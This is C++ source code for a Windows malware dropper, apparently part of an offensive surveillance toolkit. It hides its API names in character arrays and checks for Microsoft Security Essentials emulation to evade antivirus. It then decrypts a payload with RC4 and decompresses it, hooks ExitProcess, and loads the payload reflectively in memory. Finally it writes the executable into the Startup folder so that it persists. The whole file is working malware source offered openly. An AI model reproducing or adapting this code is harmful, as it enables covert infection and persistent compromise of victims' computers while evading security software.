#pragma optimize( "", off ) // *** Disable all optimizations - we need code "as is"!
#pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment

#include <windows.h>
#include <Shlobj.h>
#include "DropperCode.h"
#include "DropperCodeScout.h"
#include "depack.h"
#include "macro.h"
#include "reloc.h"

typedef PCHAR (__cdecl *MYCONF)(PULONG uWinMain);
typedef BOOL (*SHGETFOLDER)(HWND, LPTSTR, ULONG csidl, BOOL);
typedef BOOL (WINAPI *EXTRACTFILE)(PCHAR, DWORD, DWORD, DropperHeader*);
typedef int (WINAPI *MAIN)(HINSTANCE, HINSTANCE, LPSTR, int);
typedef NTSTATUS (WINAPI *ZWTERMINATEPROCESS)(HANDLE, ULONG);

__forceinline ULONG ldr_exportdir(HMODULE hModule);
__forceinline void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader);
LPVOID WINAPI _LoadLibrary(PMY_PARAMS pParams);
BOOL WINAPI ExtractFile(DWORD fileSize, DWORD originalSize, DropperHeader *header);


//int WINAPI DropperScoutEntryPoint(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
int __stdcall DropperScoutEntryPoint(DropperHeader *header)
{
	LOADLIBRARY pfn_LoadLibrary = resolveLoadLibrary();
	GETPROCADDRESS pfn_GetProcAddress = resolveGetProcAddress();

	CHAR pGetModuleHandle[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0x0 };
	CHAR pKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 }; 
	CHAR strGetModuleFileName[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', 'A', 0x0 };
	CHAR strVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
	CHAR strVirtualFree[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0x0 };
	

	GETMODULEHANDLE pfn_GetModuleHandle = (GETMODULEHANDLE)pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), pGetModuleHandle);
	GETMODULEFILENAME pfn_GetModuleFileName = (GETMODULEFILENAME) pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), strGetModuleFileName);
	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), strVirtualAlloc);
	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), strVirtualFree);

	/* Check for Microsoft Security Essential emulation */
	
	char *fName = (char *)pfn_VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
	pfn_GetModuleFileName(NULL, fName, MAX_PATH);
	DWORD prgLen = _STRLEN_(fName);

	// x86
	char x86MspEng[26] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', ' ', 'S', 'e', 'c', 'u', 'r' ,'i', 't', 'y', ' ', 'C', 'l', 'i', 'e', 'n', 't', 0x0 };
	for(DWORD i=0; i<prgLen; i++)
		if(!_STRCMP_(fName+i, x86MspEng))
			goto OEP_CALL;

	// x64
	char x64MspEng[12] = { ':', '\\', 'm', 'y', 'a', 'p', 'p', '.', 'e', 'x', 'e', 0x0 };
	if(!_STRCMP_(&fName[1], x64MspEng))
		goto OEP_CALL;
	pfn_VirtualFree(fName, 0, MEM_RELEASE);

	EXTRACTFILE pfn_ExtractFile = (EXTRACTFILE) ((char*)header + header->functions.dumpFile.offset);
	pfn_ExtractFile((char *)header + header->files.core.offset, 
		header->files.core.size, 
		header->files.core.original_size, 
		header);

	OEP_CALL:

	return 0;
}
FUNCTION_END(DropperScoutEntryPoint);

BOOL WINAPI ExtractFile(CHAR* fileData, DWORD fileSize, DWORD originalSize, DropperHeader *header)
{
	LOADLIBRARY pfn_LoadLibrary = resolveLoadLibrary();
	GETPROCADDRESS pfn_GetProcAddress = resolveGetProcAddress();
	CHAR pKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
	CHAR pVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC)pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), pVirtualAlloc);

	RC4_SKIP pfn_rc4skip = (RC4_SKIP) (((char*)header) + header->functions.rc4.offset);
	pfn_rc4skip((PBYTE)header->rc4key, 32, 0, (PBYTE)fileData, fileSize, header);

	PCHAR uncompressed = (char*) pfn_VirtualAlloc(NULL, originalSize, MEM_COMMIT, PAGE_READWRITE);
	int uncompressed_size = aP_depack(fileData, uncompressed);
	if (uncompressed_size != originalSize) {
		return FALSE;
	}

	// hook
	CHAR pVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
	CHAR pVirtualQuery[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'Q', 'u', 'e', 'r', 'y', 0x0 };
	CHAR pExitProcess[] = { 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
	CHAR strCreateThread[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x0 };


	VIRTUALPROTECT pfn_VirtualProtect = (VIRTUALPROTECT)pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), pVirtualProtect);
	VIRTUALQUERY pfn_VirtualQuery = (VIRTUALQUERY)pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), pVirtualQuery);
	CREATETHREAD pfn_CreateThread = (CREATETHREAD) pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), strCreateThread);
	PBYTE pExitProcessAddr = (PBYTE)pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), pExitProcess); 


	ULONG uOldProtect;
	MEMORY_BASIC_INFORMATION mbi;
	pfn_VirtualQuery((PVOID)pExitProcessAddr, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
	pfn_VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &uOldProtect);

	pExitProcessAddr[0] = 0xe9;

	ULONG uHookAddress = (ULONG)((PBYTE)header + header->functions.exitProcessHook.offset);
	*(PULONG)(pExitProcessAddr + 1) = (ULONG)uHookAddress - ((ULONG)pExitProcessAddr + 5); // FIXME: verifica che vada bene per calcorare il displacement
	pfn_VirtualProtect(mbi.BaseAddress, mbi.RegionSize, uOldProtect, &uOldProtect);

	PMY_PARAMS pParams = (PMY_PARAMS)pfn_VirtualAlloc(NULL, sizeof(MY_PARAMS), MEM_COMMIT, PAGE_READWRITE);
	pParams->uSize = uncompressed_size;
	pParams->pBuffer = uncompressed;
	pParams->header = header;
	
	pfn_CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ((PBYTE)header + header->functions.load.offset), pParams, 0, NULL);

	// restore hook
	if (header->stage1.size) 
	{
		DWORD oldProtect = 0;
		char *code = (char*) ( ((char*)header) + header->stage1.offset );
		size_t size = header->stage1.size;

		pfn_VirtualProtect( (LPVOID) header->stage1.VA, size, PAGE_EXECUTE_READWRITE, &oldProtect );
		_MEMCPY_( (char*) header->stage1.VA, code, size );
		pfn_VirtualProtect( (LPVOID) header->stage1.VA, size, oldProtect, &oldProtect );
	}



	return TRUE;
}
FUNCTION_END(ExtractFile);

//__forceinline LPVOID WINAPI _LoadLibrary(LPVOID lpRawBuffer, ULONG uSize)
LPVOID WINAPI _LoadLibrary(PMY_PARAMS pParams)
{
	LPVOID lpAddress = NULL;
	IMAGE_DOS_HEADER dos_header;
	IMAGE_NT_HEADERS32 pe_header;
	DWORD header_size = 0;
	LPVOID lpRawBuffer;
	ULONG uSize;

	lpRawBuffer = pParams->pBuffer;
	uSize = pParams->uSize;

	_MEMSET_(&dos_header, 0x0, sizeof(dos_header));
	_MEMSET_(&pe_header, 0x0, sizeof(dos_header));

	CHAR pNtDll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
	CHAR pKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
	CHAR pShell32[] = {'s', 'h', 'e', 'l', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
	CHAR pVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
	CHAR pVirtualFree[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0x0 };
	CHAR pVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
	CHAR strSHGetSpecialFolderPath[] = { 'S', 'H', 'G', 'e', 't', 'S', 'p', 'e', 'c', 'i', 'a', 'l', 'F', 'o', 'l', 'd', 'e', 'r', 'P', 'a', 't', 'h', 'A', 0x0 };
	CHAR strCreateFile[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x0 };
	CHAR strWriteFile[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0x0 };
	CHAR strCloseHandle[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x0 };
	CHAR strZwTerminateProcess[] = { 'Z', 'w', 'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e', 'p', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
	CHAR pExitProcess[] = { 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
	CHAR pVirtualQuery[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'Q', 'u', 'e', 'r', 'y', 0x0 };
	
	LOADLIBRARY pfn_LoadLibrary = resolveLoadLibrary();
	GETPROCADDRESS pfn_GetProcAddress = resolveGetProcAddress();
	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC)pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), pVirtualAlloc);
	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE)pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), pVirtualFree);
	VIRTUALPROTECT pfn_VirtualProtect = (VIRTUALPROTECT)pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), pVirtualProtect);
	VIRTUALQUERY pfn_VirtualQuery = (VIRTUALQUERY)pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), pVirtualQuery);
	SHGETFOLDER pfn_SHGetSpecialFolderPath = (SHGETFOLDER) pfn_GetProcAddress(pfn_LoadLibrary(pShell32), strSHGetSpecialFolderPath);
	CREATEFILE pfn_CreateFile = (CREATEFILE) pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), strCreateFile);
	WRITEFILE pfn_WriteFile = (WRITEFILE) pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), strWriteFile);
	CLOSEHANDLE pfn_CloseHandle = (CLOSEHANDLE) pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), strCloseHandle);
	ZWTERMINATEPROCESS pfn_ZwTerminateProcess = (ZWTERMINATEPROCESS) pfn_GetProcAddress(pfn_LoadLibrary(pNtDll), strZwTerminateProcess);
	PBYTE pExitProcessAddr = (PBYTE)pfn_GetProcAddress(pfn_LoadLibrary(pKernel32), pExitProcess); 

	if (lpRawBuffer != NULL)
	{
		_MEMCPY_(&dos_header, lpRawBuffer, sizeof(dos_header));	// get DOS HEADER
		if (dos_header.e_magic != IMAGE_DOS_SIGNATURE || dos_header.e_lfanew == 0)
		{	// invalid MZ signature
			return lpAddress;
		}

		_MEMCPY_(&pe_header, CALC_OFFSET(LPVOID, lpRawBuffer, dos_header.e_lfanew), sizeof(pe_header));
		if (pe_header.Signature != IMAGE_NT_SIGNATURE)
		{	// invalid PE signature
			return lpAddress;
		}

		lpAddress = pfn_VirtualAlloc(NULL, pe_header.OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);	// allocate image
		if (lpAddress == NULL)
		{	// wrong image size or insufficient memory!
			return lpAddress;
		}

		header_size = dos_header.e_lfanew + 
			pe_header.FileHeader.SizeOfOptionalHeader + 
			sizeof(pe_header.FileHeader) + 4;

		IMAGE_SECTION_HEADER section;
		LPVOID lpBufferPtr = CALC_OFFSET(LPVOID, lpRawBuffer, header_size);
		_MEMCPY_(&section, lpBufferPtr, sizeof(section));
		
		// now first section is in memory?!?!?

		_MEMCPY_(lpAddress, lpRawBuffer, section.PointerToRawData);	// loading PE header in memory!
		PIMAGE_SECTION_HEADER sections = CALC_OFFSET(PIMAGE_SECTION_HEADER, lpAddress, header_size);
		for(USHORT i = 0; i < pe_header.FileHeader.NumberOfSections; i++, sections++)
		{
			LPVOID lpSectionBuffer = CALC_OFFSET(LPVOID, lpAddress, sections->VirtualAddress);
			// raw copy ..
			// @TODO: PointerToRawData can be 0 for uninitialized sections like SizeOfRawData
			_MEMCPY_(lpSectionBuffer, CALC_OFFSET(LPVOID, lpRawBuffer, sections->PointerToRawData), sections->SizeOfRawData);
		}
	}
	DWORD ignore = 0;

	// section initialized!
	// @TODO: relocations
	ldr_reloc(lpAddress, &pe_header);
	// @TODO: IAT
	ldr_importdir((HMODULE) lpAddress, &pe_header);

	MYCONF MyConf = (MYCONF)ldr_exportdir((HMODULE) lpAddress);
	
	// @TODO: Applying section privilege
	PIMAGE_SECTION_HEADER sections = CALC_OFFSET(PIMAGE_SECTION_HEADER, lpAddress, header_size);
	
	for(USHORT i = 0; i < pe_header.FileHeader.NumberOfSections; i++, sections++)
	{
		LPVOID lpSectionBuffer = CALC_OFFSET(LPVOID, lpAddress, sections->VirtualAddress);
	
		if ((sections->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE)
		{	// set +X to page!
			
			pfn_VirtualProtect(lpSectionBuffer, sections->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &ignore);
		}
	}
	// at end set +R section
	pfn_VirtualProtect(lpAddress, header_size, PAGE_READONLY, &ignore);

	ULONG uWinMain;
	PCHAR pName = MyConf(&uWinMain);	
	PCHAR pStartupPath = (PCHAR)pfn_VirtualAlloc(NULL, 32767, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	pfn_SHGetSpecialFolderPath(NULL, pStartupPath, CSIDL_STARTUP, TRUE);

	ULONG uLen = _STRLEN_(pStartupPath);
	*(pStartupPath + uLen++) = '\\';
	*(pStartupPath + uLen) = 0x0;

	ULONG uLen2 = _STRLEN_(pName);
	_MEMCPY_(pStartupPath + uLen, pName, uLen2);

	CHAR pExe[] = { '.', 'e', 'x', 'e', 0x0 };
	_MEMCPY_(pStartupPath + uLen + uLen2, pExe, 4);

	// copy file
	HANDLE hFile = pfn_CreateFile(pStartupPath, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile)
	{
		ULONG uWritten = 0;
		BOOL bRet = pfn_WriteFile(hFile, lpRawBuffer, uSize, &uWritten, NULL);
		if (bRet)
		{
			pfn_CloseHandle(hFile);
		}
	}
	pfn_VirtualFree(pStartupPath, 0, MEM_RELEASE);

	MAIN ptrMain = (MAIN)CALC_OFFSET(LPVOID, lpAddress, pe_header.OptionalHeader.AddressOfEntryPoint);
	ptrMain((HINSTANCE)lpAddress, NULL, "", 0xa);
	
	//MAIN pfn_WinMain = (MAIN)uWinMain;
	//pfn_WinMain((HINSTANCE)lpAddress, NULL, "", 0xa);

	// restore ExitProcessHook and give a go to sleeping threads
	ULONG uOldProtect;
	MEMORY_BASIC_INFORMATION mbi;
	pfn_VirtualQuery((PVOID)pExitProcessAddr, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
	pfn_VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &uOldProtect);
	*(PULONG)(pExitProcessAddr + 1) = 0xec8b55c0;
	pExitProcessAddr[0] = 0x88;
	pfn_VirtualProtect(mbi.BaseAddress, mbi.RegionSize, uOldProtect, &uOldProtect);
	
	pParams->header->synchro = 1;

	// sleep 0
	pfn_ZwTerminateProcess(INVALID_HANDLE_VALUE, 0);

	return CALC_OFFSET(LPVOID, lpAddress, pe_header.OptionalHeader.AddressOfEntryPoint);
}
FUNCTION_END(_LoadLibrary);

__forceinline void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader)
{
	DWORD dwIatSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
	DWORD dwIatAddr = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

	LOADLIBRARY pfn_LoadLibrary = resolveLoadLibrary();
	GETPROCADDRESS pfn_GetProcAddress = resolveGetProcAddress();

	// no import directory here!
	if (dwIatAddr == 0)
		return;

	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = CALC_OFFSET(PIMAGE_IMPORT_DESCRIPTOR, pModule, dwIatAddr);

	while(pImportDescriptor)
	{
		if (pImportDescriptor->FirstThunk == 0)
		{
			pImportDescriptor = NULL;
			continue;
		}

		LPDWORD pImportLookupTable = CALC_OFFSET(LPDWORD, pModule, pImportDescriptor->FirstThunk);
		LPCSTR lpModName = CALC_OFFSET(LPCSTR, pModule, pImportDescriptor->Name);	
		HMODULE hMod = pfn_LoadLibrary(lpModName);

		if (hMod != NULL)
			while(*pImportLookupTable != 0x00)
			{
				if ((*pImportLookupTable & IMAGE_ORDINAL_FLAG) != 0x00)
				{	// IMPORT BY ORDINAL
					DWORD pOrdinalValue = *(CALC_OFFSET(LPDWORD, pImportLookupTable, 0)) & 0x0000ffff;
					*pImportLookupTable = (DWORD) pfn_GetProcAddress(hMod, (LPCSTR) pOrdinalValue);
				}
				else
				{	// IMPORT BY NAME
					LPCSTR lpProcName = CALC_OFFSET_DISP(LPCSTR, pModule, (*pImportLookupTable), 2);	// adding two bytes
					*pImportLookupTable = (DWORD) pfn_GetProcAddress(hMod, lpProcName);
				}
				pImportLookupTable++;		
			}
		pImportDescriptor++;
	}

}


__forceinline ULONG ldr_exportdir(HMODULE hModule)
{
	ULONG pFunction = NULL;
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER) hModule;
	PIMAGE_NT_HEADERS pImageNtHeaders = CALC_OFFSET(PIMAGE_NT_HEADERS, hModule, pImageDosHeader->e_lfanew);
	PIMAGE_DATA_DIRECTORY pExportDir = &pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	if (pExportDir->Size == 0 || pExportDir->VirtualAddress == 0)
	{	// this module have no export directory)
		return pFunction;
	}
	
	// Processing export directory table
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY) ((PBYTE)pExportDir->VirtualAddress + (ULONG)hModule);

	//DWORD dwOrdinalBase = pExportDirectory->Base;

	// Fixing pointer with BASE
	pExportDirectory->AddressOfNames += DWORD(hModule);
	pExportDirectory->AddressOfFunctions += DWORD(hModule);
	pExportDirectory->AddressOfNameOrdinals += DWORD(hModule);

	// Fixing pointers of names and functions
	LPDWORD ptrFunctions = (LPDWORD) pExportDirectory->AddressOfFunctions;
	LPDWORD ptrNames = (LPDWORD) pExportDirectory->AddressOfNames;

	for(DWORD i = 0; i < pExportDirectory->NumberOfNames; i++)
	{
		ptrFunctions[i] += (DWORD) hModule;
		ptrNames[i] += (DWORD) hModule;

		pFunction = ptrFunctions[i];
	}

	return pFunction;
}


typedef struct base_relocation_block
{
	DWORD PageRVA;
	DWORD BlockSize;
} base_relocation_block_t;

typedef struct base_relocation_entry
{
	WORD offset : 12;
	WORD type : 4;
} base_relocation_entry_t;

// Parse reloc table
__forceinline void ldr_reloc(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader)
{
	DWORD dwRelocSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
	DWORD dwRelocAddr = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

	if (dwRelocAddr == 0 || dwRelocSize == 0)
		return;	// no reloc table here!

	LPBYTE lpPtr =CALC_OFFSET(LPBYTE, pModule, dwRelocAddr);

	//std::cout << "sizeof(base_relocation_block): " << sizeof(base_relocation_block) << std::endl;
	//std::cout << "sizeof(base_relocation_entry): " << sizeof(base_relocation_entry) << std::endl;

	while(dwRelocSize > 0)
	{
		base_relocation_block_t block;

		_MEMCPY_(&block, lpPtr, sizeof(base_relocation_block_t));

		dwRelocSize -= block.BlockSize;

		lpPtr += sizeof(base_relocation_block_t);

		//std::cout << "Block: " << std::hex << block.PageRVA << std::endl;
		//std::cout << " Size: " << std::hex << block.BlockSize << std::endl;

		block.BlockSize -= 8;

		while(block.BlockSize)
		{
			base_relocation_entry_t entry;

			_MEMCPY_(&entry, lpPtr, sizeof(WORD));
						
			LPDWORD ptrOffset = CALC_OFFSET(LPDWORD, pModule, block.PageRVA + entry.offset);
			DWORD dwOldValue = *ptrOffset;
			
			DWORD dwNewValue = dwOldValue -
				pImageNtHeader->OptionalHeader.ImageBase +
				(DWORD) pModule;

			LPWORD ptrHighOffset = CALC_OFFSET_DISP(LPWORD, pModule, block.PageRVA + entry.offset, 2);
			LPWORD ptrLowOffset = CALC_OFFSET_DISP(LPWORD, pModule, block.PageRVA + entry.offset, 0);

			WORD wLowNewOffset = (WORD) ((DWORD) pModule & 0xffff);
			WORD wHighNewOffset = (WORD) (((DWORD) pModule & 0xffff0000) >> 16);

			switch(entry.type)
			{
// The base relocation is skipped. This type can be used to pad a block.
				case IMAGE_REL_BASED_ABSOLUTE:
						//std::cout << "Unsupported" << std::endl;
					break;
// The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the high value of a 32-bit word.
				case IMAGE_REL_BASED_HIGH: 
						//*ptrHighOffset = *ptrHighOffset - wHighNewOffset;
					break;
// The base relocation adds the low 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the low half of a 32-bit word. 
				case IMAGE_REL_BASED_LOW:
					break;
// The base relocation applies all 32 bits of the difference to the 32-bit field at offset
				case IMAGE_REL_BASED_HIGHLOW:
						*ptrOffset = dwNewValue;
					break;
// The base relocation adds the high 16 bits of the difference to the 16bit field at offset. The 16-bit field represents the high value of a 32-bit word.
// The low 16 bits of the 32-bit value are stored in the 16-bit word that follows this base relocation. This means that this base relocation occupies two slots.
				case IMAGE_REL_BASED_HIGHADJ:
					break;
// The base relocation applies the difference to the 64-bit field at offset.
				case IMAGE_REL_BASED_DIR64:
					break;
			}

			// FIX ENTRY++

			lpPtr += sizeof(base_relocation_entry);
			block.BlockSize -= 2;
		}

	}

}

#pragma code_seg()
#pragma optimize( "", on )
